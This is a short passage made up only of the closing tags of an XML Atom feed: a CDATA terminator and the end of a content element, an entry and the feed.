]]></content>
    </entry>
</feed>